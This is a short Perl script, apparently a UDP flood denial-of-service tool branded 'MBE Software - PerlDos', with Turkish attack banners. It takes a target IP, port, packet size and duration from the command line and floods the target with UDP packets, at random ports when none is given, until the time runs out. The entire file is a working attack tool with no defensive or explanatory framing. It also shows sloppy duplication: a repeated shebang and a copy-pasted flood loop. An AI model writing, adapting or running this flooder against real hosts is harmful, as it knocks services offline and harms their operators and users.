#!/usr/bin/perl
 
##
#!/usr/bin/perl
 
use Socket;
use strict;
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "perl NaTPV1.pl Ip Port 800 800 300 [MBE Software - PerlDos] $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);
 
 
print <<EOTEXT;
EOTEXT
     
print "~Saldiri Basladi Edit : MBE Software - PerlDos* : $ip " . ($port ? $port : "random") . " SALDIRI GUCU " .
($size ? "$size-Gbit" : "Smacked With A Large Packets?") . " " .
($time ? "for $time Saniye" : "") . "\n";
  
for (;time() <= $endtime;) {
$psize = $size ? $size : int(rand(1024-64)+64) ;
$pport = $port ? $port : int(rand(65500))+1;
     
send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
$iaddr));}for (;time() <= $endtime;) {
$psize = $size ? $size : int(rand(1024-64)+64) ;
$pport = $port ? $port : int(rand(65500))+1;
 
send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
$iaddr));}